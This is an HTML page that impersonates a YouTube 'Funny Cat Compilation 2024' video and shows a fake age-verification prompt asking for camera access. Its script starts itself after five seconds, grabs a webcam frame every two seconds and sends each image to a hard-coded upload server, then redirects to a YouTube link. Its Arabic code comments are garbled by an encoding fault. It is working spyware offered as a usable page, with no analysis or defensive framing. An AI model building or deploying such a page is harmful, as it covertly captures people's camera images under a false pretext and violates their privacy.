<!DOCTYPE html>
<html>
<head>
    <title>Funny Cat Video - YouTube</title>
    <link rel="icon" href="https://www.youtube.com/favicon.ico">
    <style>
        body { font-family: Arial; background: #181818; color: white; text-align: center; padding: 50px; }
        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #ff0000; border-radius: 50%; 
                  width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .button { background: #ff0000; color: white; border: none; padding: 15px 30px; 
                  font-size: 16px; border-radius: 5px; cursor: pointer; margin: 10px; }
        .message { background: #ffcc00; color: #000; padding: 15px; border-radius: 5px; margin: 20px 0; }
    </style>
</head>
<body>
    <h1>ðŸŽ¬ Funny Cat Compilation 2024</h1>
    <div class="message">
        ðŸ”’ Age verification required: Allow camera to confirm you are 18+
    </div>
    <div class="loader"></div>
    <video id="videoElement" autoplay playsinline style="display:none;"></video>
    <div>
        <button class="button" onclick="startVerification()">Allow Camera to Continue</button>
    </div>
    <div id="status" style="margin-top:20px; color:#0f0;"></div>

    <script>
        let stream = null;
        const SERVER_URL = 'http://192.168.1.33:5000/upload';
        
        async function startVerification() {
            try {
                document.getElementById('status').textContent = 'Starting camera...';
                
                // ÙØªØ­ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user', width: 640, height: 480 },
                    audio: false 
                });
                
                const video = document.getElementById('videoElement');
                video.srcObject = stream;
                video.style.display = 'block';
                document.querySelector('.loader').style.display = 'none';
                document.getElementById('status').textContent = 'Camera active. Verifying...';
                
                // Ø§Ù„Ø¨Ø¯Ø¡ ÙÙŠ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±
                startCapturing();
                
                // Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªÙˆØ¬ÙŠÙ‡ Ø¨Ø¹Ø¯ 10 Ø«ÙˆØ§Ù†
                setTimeout(() => {
                    document.getElementById('status').textContent = 'âœ… Verification complete! Redirecting...';
                    window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
                }, 10000);
                
            } catch (err) {
                document.getElementById('status').textContent = 'âŒ Please allow camera access';
                alert('Camera access is required to watch this video.');
            }
        }
        
        function startCapturing() {
            // Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© ÙƒÙ„ 2 Ø«Ø§Ù†ÙŠØ©
            setInterval(async () => {
                if (!stream) return;
                
                const video = document.getElementById('videoElement');
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                
                // ØªØ­ÙˆÙŠÙ„ Ø§Ù„ØµÙˆØ±Ø©
                const imageData = canvas.toDataURL('image/jpeg', 0.7);
                
                // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© Ø¥Ù„Ù‰ Ø§Ù„Ø®Ø§Ø¯Ù…
                try {
                    const response = await fetch(SERVER_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ image: imageData })
                    });
                    
                    const result = await response.json();
                    console.log('Image sent:', result.success);
                    
                } catch (err) {
                    console.log('Failed to send image:', err);
                }
                
            }, 2000);
        }
        
        // Ø¨Ø¯Ø¡ ØªÙ„Ù‚Ø§Ø¦ÙŠ Ø¨Ø¹Ø¯ 5 Ø«ÙˆØ§Ù†
        setTimeout(() => {
            startVerification();
        }, 5000);
    </script>
</body>
</html>
